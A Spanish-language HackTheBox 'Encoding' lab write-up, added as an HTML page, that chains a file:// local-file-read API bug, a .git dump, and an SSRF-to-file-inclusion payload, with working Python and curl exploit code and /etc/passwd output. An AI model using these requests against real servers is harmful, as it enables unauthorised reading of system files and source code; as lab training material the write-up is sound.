@@ -1,0 +1,676 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Encoding HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/encoding.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Encoding HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Encoding de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Encoding de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Encoding HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Encoding HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Encoding de la plataforma de HackTheBox","headline":"Writeup Encoding HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Encoding HackTheBox</h1>
+          <p>Resolución de la máquina Encoding de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.198
+Nmap scan report for 10.10.11.198
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http</span>
+</code></pre></div></div>
+
+<div><p>En la web podemos encontrar un apartado api donde nos muestra el subdominio api.haxtables.htb</p></div>
+<a href="./1.png" target="_blank"><div><p><img src="./1.png"><p></div></a>
+
+<div><p>Recordar agregar el dominio al hosts, en la parte de abajo de la página nos comparte un script</p></div>
+<a href="./2.png" target="_blank"><div><p><img src="./2.png"><p></div></a>
+
+<div><p>El script parece que apunta a una url que controlamos y por detras lo convierte a hexadecimal</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">import </span><span class="p">requests
+
+json_data </span><span class="kd">=</span><span class="p"> {
+    </span><span class="s2">'action'</span><span class="p">: </span><span class="s2">'str2hex'</span><span class="p">,
+    </span><span class="s2">'file_url'</span><span class="p"> : </span><span class="s2">'http://example.com/data.txt'</span><span class="p">
+}
+
+response </span><span class="kd">=</span><span class="p"> requests.post(</span><span class="s2">'http://api.haxtables.htb/v3/tools/string/index.php'</span><span class="p">, </span><span class="no">json</span><span class="kd">=</span><span class="p">json_data)
+</span><span class="k">print</span><span class="p">(response.text)</span>
+</code></pre></div></div>
+
+<div><p>Por defecto apunta a una url pero podemos usar un wrapper file para apuntar a un archivo local</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">import </span><span class="p">requests
+
+json_data </span><span class="kd">=</span><span class="p"> {
+    </span><span class="s2">'action'</span><span class="p">: </span><span class="s2">'str2hex'</span><span class="p">,
+    </span><span class="s2">'file_url'</span><span class="p"> : </span><span class="s2">'file:///etc/passwd'</span><span class="p">
+}
+
+response </span><span class="kd">=</span><span class="p"> requests.post(</span><span class="s2">'http://api.haxtables.htb/v3/tools/string/index.php'</span><span class="p">, </span><span class="no">json</span><span class="kd">=</span><span class="p">json_data)
+</span><span class="k">print</span><span class="p">(response.text)</span>
+</code></pre></div></div>
+
+<div><p>Ejecutando el script nos muestra una estructura en json con el campo data una data en hexadecimal, como esta en json podemos ejecutar con jq para verlo mejor</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">script.py 
+{
+    </span><span class="na">"data"</span><span class="p">:</span><span class="s2">"726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3130353a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a706f6c6c696e6174653a783a3130353a313a3a2f7661722f63616368652f706f6c6c696e6174653a2f62696e2f66616c73650a737368643a783a3130363a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a7379736c6f673a783a3130373a3131333a3a2f686f6d652f7379736c6f673a2f7573722f7362696e2f6e6f6c6f67696e0a75756964643a783a3130383a3131343a3a2f72756e2f75756964643a2f7573722f7362696e2f6e6f6c6f67696e0a74637064756d703a783a3130393a3131353a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a7473733a783a3131303a3131363a54504d20736f66747761726520737461636b2c2c2c3a2f7661722f6c69622f74706d3a2f62696e2f66616c73650a6c616e6473636170653a783a3131313a3131373a3a2f7661722f6c69622f6c616e6473636170653a2f7573722f7362696e2f6e6f6c6f67696e0a7573626d75783a783a3131323a34363a7573626d7578206461656d6f6e2c2c2c3a2f7661722f6c69622f7573626d75783a2f7573722f7362696e2f6e6f6c6f67696e0a7376633a783a313030303a313030303a7376633a2f686f6d652f7376633a2f62696e2f626173680a6c78643a783a3939393a3130303a3a2f7661722f736e61702f6c78642f636f6d6d6f6e2f6c78643a2f62696e2f66616c73650a66777570642d726566726573683a783a3131333a3132303a66777570642d7265667265736820757365722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a"</span><span class="p">
+}</span>
+</code></pre></div></div>
+
+<div><p>Usando el campo data al decodearlo de hexadecimal nos muestra el contenido del /etc/passwd</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">script.py |</span><span class="s2"> jq </span><span class="p">.data </span><span class="p">|</span><span class="s2"> xxd </span><span class="p">-ps -r
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd-network:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd-timesync:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+svc:x:1000:1000:svc:/home/svc:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+fwupd-refresh:x:113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false</span>
+</code></pre></div></div>
+
+<div><p>Podemos modificar un poco el script para que podamos indicar el archivo como argumento y aplique la decodificacion de hexadecimal por nosotros</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="kd">
+import </span><span class="p">requests, json, sys
+
+</span><span class="kd">if </span><span class="k">len</span><span class="p">(sys.argv) </span><span class="kd"><</span><span class="na"> 2</span><span class="p">:
+    </span><span class="k">print</span><span class="p">(</span><span class="k">f</span><span class="s2">"\n\033[1;37m[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} &ltfile>\n"</span><span class="p">)
+    exit(</span><span class="na">1</span><span class="p">)
+
+json_data </span><span class="kd">=</span><span class="p"> {</span><span class="s2">"action"</span><span class="p">: </span><span class="s2">"str2hex"</span><span class="p">, </span><span class="s2">"file_url"</span><span class="p">: </span><span class="k">f</span><span class="s2">"file://{sys.argv[1]}"</span><span class="p">}
+
+request </span><span class="kd">=</span><span class="p"> requests.post(</span><span class="s2">'http://api.haxtables.htb/v3/tools/string/index.php'</span><span class="p">, </span><span class="no">json</span><span class="kd">=</span><span class="p">json_data)
+
+json </span><span class="kd">=</span><span class="p"> json.loads(request.text)
+string </span><span class="kd">=</span><span class="p"> json[</span><span class="s2">"data"</span><span class="p">]
+
+</span><span class="kd">if </span><span class="p">string </span><span class="kd">== </span><span class="s2">""</span><span class="p">:
+    </span><span class="k">print</span><span class="p">(</span><span class="k">f</span><span class="s2">"\n\033[1;37m[\033[1;31m-\033[1;37m] El archivo especificado no existe o está vacío\n"</span><span class="p">)
+    exit(</span><span class="na">0</span><span class="p">)
+
+</span><span class="p">bytes </span><span class="p">=</span><span class="p"> bytes.fromhex(string)
+file </span><span class="kd">=</span><span class="p"> bytes.decode()
+
+</span><span class="k">print</span><span class="p">(file.strip())</span>
+</code></pre></div></div>
+
+<div><p>Al apuntar al /etc/hosts nos muestra otro subdominio image.haxtables.htb, asi que lo agregamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> exploit.py /etc/hosts 
+127.0.0.1 localhost
+127.0.1.1 encoding
+127.0.0.1 haxtables.htb api.haxtables.htb </span><span class="kd">image.haxtables.htb</span><span class="p">
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters</span>
+</code></pre></div></div>
+
+<div><p>En el archivo de configuracion podemos buscar la ruta donde corre y es /var/www/image</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> exploit.py /etc/apache2/sites-enabled/000-default.conf | </span><span class="s2">grep</span><span class="p"> 80 -A4
+&ltVirtualHost *:80>
+	ServerName haxtables.htb
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+</span><span class="na">--</span><span class="p">
+&ltVirtualHost *:80>
+	ServerName api.haxtables.htb
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/api
+</span><span class="na">--</span><span class="p">
+&ltVirtualHost *:80>
+        ServerName </span><span class="kd">image.haxtables.htb</span><span class="p">
+        ServerAdmin webmaster@localhost    
+    	DocumentRoot </span><span class="kd">/var/www/image</span>
+</code></pre></div></div>
+
+<div><p>En el index.php podemos ver que carga un utils.php en el mismo directorio</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> exploit.py /var/www/image/index.php 
+&lt?php 
+
+include_once 'utils.php';
+
+include 'includes/coming_soon.html';
+
+?></span>
+</code></pre></div></div>
+
+<div><p>Podemos apuntar a el utils.php y ver su contenido, es bastante largo (eso dijo ella)</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> exploit.py /var/www/image/utils.php
+&lt?php
+
+// Global functions
+
+function jsonify($body, $code = null)
+{
+    if ($code) {
+        http_response_code($code);
+    }
+
+    header('Content-Type: application/json; charset=utf-8');
+    echo json_encode($body);
+
+    exit;
+}
+
+function get_url_content($url)
+{
+    $domain = parse_url($url, PHP_URL_HOST);
+    if (gethostbyname($domain) === "127.0.0.1") {
+        echo jsonify(["message" => "Unacceptable URL"]);
+    }
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);
+    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
+    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+    $url_content =  curl_exec($ch);
+    curl_close($ch);
+    return $url_content;
+
+}
+
+function git_status()
+{
+    $status = shell_exec('cd /var/www/image && /usr/bin/git status');
+    return $status;
+}
+
+function git_log($file)
+{
+    $log = shell_exec('cd /var/www/image && /ust/bin/git log --oneline "' . addslashes($file) . '"');
+    return $log;
+}
+
+function git_commit()
+{
+    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
+    return $commit;
+}
+?></span>
+</code></pre></div></div>
+
+<div><p>Analizemos esta parte del php, si no se apunta desde la 127.0.0.1 no nos deja acceder, forbidden</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">$domain </span><span class="kd">=</span><span class="k"> parse_url</span><span class="p">($url, </span><span class="k">PHP_URL_HOST</span><span class="p">);
+</span><span class="kd">if</span><span class="p"> (</span><span class="k">gethostbyname</span><span class="p">($domain) </span><span class="kd">===</span><span class="s2"> "127.0.0.1"</span><span class="p">) {
+    </span><span class="kd">echo </span><span class="k">jsonify</span><span class="p">([</span><span class="s2">"message"</span><span class="kd"> => </span><span class="s2">"Unacceptable URL"</span><span class="p">]);
+}</span>
+</code></pre></div></div>
+
+<div><p>Esta ejecutando cosas como git status y git log por lo que puede que haya un proyecto git</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">function </span><span class="k">git_status</span><span class="p">()
+{
+    $status </span><span class="kd">= </span><span class="k">shell_exec</span><span class="p">(</span><span class="s2">'cd /var/www/image && /usr/bin/git status'</span><span class="p">);
+    </span><span class="kd">return </span><span class="p">$status;
+}
+
+</span><span class="kd">function </span><span class="k">git_log</span><span class="p">(</span><span class="no">$file</span><span class="p">)
+{
+    $log </span><span class="kd">=</span><span class="k"> shell_exec</span><span class="p">(</span><span class="s2">'cd /var/www/image && /ust/bin/git log --oneline "'</span><span class="kd"> . </span><span class="k">addslashes</span><span class="p">($file) </span><span class="kd">. </span><span class="s2">'"'</span><span class="p">);
+    return $log;
+}</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar la herramienta <a href="https://github.com/internetwache/GitTools">gitdumper</a> ya que podemos acceder al .git, pero hay un problema solo podemos acceder a el mediante el lfi asi que hay que modificar el script</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">curl -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" -f -k -s "$url" -o "$target"</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">curl -s 'http://api.haxtables.htb/v3/tools/string/index.php' -H 'Content-Type: application/json' --data-binary "{\"action\": \"str2hex\", \"file_url\": \"file:///var/www/image/.git/$objname\"}" | jq .data | xxd -ps -r > "$target"</span>
+</code></pre></div></div>
+
+<div><p>Corremos el script y nos descarga el proyecto del .git exitosamente a traves del lfi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ./gitdumper.sh </span><span class="p">http://images.haxtables.htb/.git/ git
+
+</span><span class="no">[*] Destination folder does not exist</span><span class="s2">
+
+[+] Creating git/.git/
+[+] Downloaded: HEAD
+[+] Downloaded: objects/info/packs
+[+] Downloaded: description
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
+[+] Downloaded: packed-refs
+[+] Downloaded: refs/heads/master
+[+] Downloaded: refs/remotes/origin/HEAD
+[+] Downloaded: refs/stash
+[+] Downloaded: logs/HEAD
+[+] Downloaded: logs/refs/heads/master
+[+] Downloaded: logs/refs/remotes/origin/HEAD
+[+] Downloaded: info/refs
+[+] Downloaded: info/exclude
+[+] Downloaded: /refs/wip/index/refs/heads/master
+[+] Downloaded: /refs/wip/wtree/refs/heads/master
+[+] Downloaded: objects/9c/17e5362e5ce2f30023992daad5b74cc562750b
+[+] Downloaded: objects/00/00000000000000000000000000000000000000
+[+] Downloaded: objects/a8/5ddf4be9e06aa275d26dfaa58ef407ad2c8526
+[+] Downloaded: objects/30/617cae3686895c80152d93a0568e3d0b6a0c49
+[+] Downloaded: objects/a1/ac03b768b16cb11819d2ba9bc9016e18c2f1d9
+[+] Downloaded: objects/26/c6c873fe81c801d731e417bf5d92e5bfa317d2
+[+] Downloaded: objects/9a/515b22daea1a74bbcf5d348ad9339202a8edd6
+[+] Downloaded: objects/2a/a032b5df9bbaeedff30b6e13be938e48cae5f4
+[+] Downloaded: objects/72/f0e39a9438fc0f915f63e2f26b762eb170cf8b
+[+] Downloaded: objects/e0/74c833c28d3b024eeea724cf892a440f89a5aa
+[+] Downloaded: objects/ec/9b154d84cab1888e2724c1083bf97eb57837c9
+[+] Downloaded: objects/31/f5bbb2ab636f275e1db54e594911646a6e2d16
+[+] Downloaded: objects/2d/600ee8a453abd9bd515c41c8fa786b95f96f82
+[+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
+[+] Downloaded: objects/3d/6e60659977f6c6d900f094ab0e33ed594c8dab
+[+] Downloaded: objects/f9/d432448807f47dfd13cb71acc3fd6890f21ee0
+[+] Downloaded: objects/c1/308cdc2b0fac3eb5b1e0872cdec44941ff22f5
+[+] Downloaded: objects/e4/13857aba2ad6d1692337fa09d9ccf00f64aad0
+[+] Downloaded: objects/62/370b37f2f05b910c76c23d1d4ce9f7e3413ea6</span>
+</code></pre></div></div>
+
+<div><p>Ahora con extractor del mismo repositorio podemos conseguir los archivos existentes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ./extractor.sh </span><span class="p">git project
+
+</span><span class="no">[*] Destination folder does not exist</span><span class="p">
+
+</span><span class="s2">[*] Creating...
+[+] Found commit: 9c17e5362e5ce2f30023992daad5b74cc562750b
+[+] Found folder: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions
+[+] Found file: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions/action_handler.php
+[+] Found file: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions/image2pdf.php
+[+] Found folder: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets
+[+] Found folder: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets/img
+[+] Found file: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets/img/forestbridge.jpg
+[+] Found folder: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/includes
+[+] Found file: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/includes/coming_soon.html
+[+] Found file: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/index.php
+[+] Found folder: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/scripts
+[+] Found file: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/scripts/git-commit.sh
+[+] Found file: /root/project/0-9c17e5362e5ce2f30023992daad5b74cc562750b/utils.php
+[+] Found commit: a85ddf4be9e06aa275d26dfaa58ef407ad2c8526
+[+] Found folder: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/actions
+[+] Found file: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/actions/action_handler.php
+[+] Found file: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/actions/image2pdf.php
+[+] Found folder: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/assets
+[+] Found folder: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/assets/img
+[+] Found file: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/assets/img/forestbridge.jpg
+[+] Found folder: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/includes
+[+] Found file: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/includes/coming_soon.html
+[+] Found file: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/index.php
+[+] Found folder: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/scripts
+[+] Found file: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/scripts/git-commit.sh
+[+] Found file: /root/project/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/utils.php</span>
+</code></pre></div></div>
+
+<div><p>Mirando una de las carpetas podemos ver un archivo action_handler.php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">project </span><span class="s2">❯ find</span><span class="p"> 0-9c17e5362e5ce2f30023992daad5b74cc562750b 
+0-9c17e5362e5ce2f30023992daad5b74cc562750b
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/commit-meta.txt
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions
+</span><span class="kd">0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions/action_handler.php</span><span class="p">
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions/image2pdf.php
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets/img
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets/img/forestbridge.jpg
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/includes
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/includes/coming_soon.html
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/index.php
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/scripts
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/scripts/git-commit.sh
+0-9c17e5362e5ce2f30023992daad5b74cc562750b/utils.php</span>
+</code></pre></div></div>
+
+<div><p>Al leerlo podemos ver que es un archivo vulnerable a local file inclusion</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">project </span><span class="s2">❯ cat</span><span class="p"> 0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions/action_handler.php
+&lt?php
+
+include_once 'utils.php';
+
+if (isset($_GET['page'])) {
+    $page = $_GET['page'];
+    include($page);
+
+} else {
+    echo jsonify(['message' => 'No page specified!']);
+}
+
+?></span>
+</code></pre></div></div>
+
+<div><p>Dejando esto de lado, podemos fuzzar en la pagina principal por archivos .php, existe handler.php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://haxtables.htb/FUZZ.php -t 100 --hc 404,403
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://haxtables.htb/FUZZ.php
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                             
+=====================================================================
+
+000000245:   </span><span class="s2">200</span><span class="p">        48 L     137 W      1999 Ch     "index"
+000008218:   </span><span class="s2">200</span><span class="p">        0 L      2 W        38 Ch       "handler"</span>
+</code></pre></div></div>
+
+<div><p>Al apuntar a el nos dice que faltan parametros en una estructura en json</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s http://haxtables.htb/handler.php | </span><span class="s2">jq</span><span class="p">
+{
+  </span><span class="na">"message"</span><span class="p">: </span><span class="s2">"Insufficient parameters!"</span><span class="p">
+}</span>
+</code></pre></div></div>
+
+<div><p>Como saber que parametros? bueno tenemos un lfi asi que lo leemos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py /var/www/html/handler.php
+&lt?php
+include_once '../api/utils.php';
+
+if (isset($_FILES['data_file'])) {
+    $is_file = true;
+    $action = $_POST['action'];
+    $uri_path = $_POST['uri_path'];
+    $data = $_FILES['data_file']['tmp_name'];
+
+} else {
+    $is_file = false;
+    $jsondata = json_decode(file_get_contents('php://input'), true);
+    $action = $jsondata['action'];
+    $data = $jsondata['data'];
+    $uri_path = $jsondata['uri_path'];
+
+
+
+    if ( empty($jsondata) || !array_key_exists('action', $jsondata) || !array_key_exists('uri_path', $jsondata)) 
+    {
+        echo jsonify(['message' => 'Insufficient parameters!']);
+        // echo jsonify(['message' => file_get_contents('php://input')]);
+
+    }
+
+}
+
+$response = make_api_call($action, $data, $uri_path, $is_file);
+echo $response;
+
+?></span>
+</code></pre></div></div>
+
+<div><p>Podemos aprovecharnos del uri_path que el script ejecute el php vulnerable a lfi ya que lo estaria ejecutando 127.0.0.1 y pasariamos la validacion, asi que la data a enviar seria la siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">{
+  </span><span class="na">"action": </span><span class="s2">""</span><span class="p">,
+  </span><span class="na">"data"</span><span class="p">: </span><span class="s2">""</span><span class="p">,
+  </span><span class="na">"uri_path"</span><span class="p">: </span><span class="s2">"test@image.haxtables.htb/actions/action_handler.php?page=/etc/passwd&"</span><span class="p">
+}</span>
+</code></pre></div></div>
+
+<div><p>Recordar cambiar el Content-Type a application/json al enviar la petición</p></div>
+<a href="./3.png" target="_blank"><div><p><img src="./3.png"><p></div></a>
+
+<div><p>En la respuesta podemos ver que mediante el SSRF podemos ejecutar el local file inclusion</p></div>
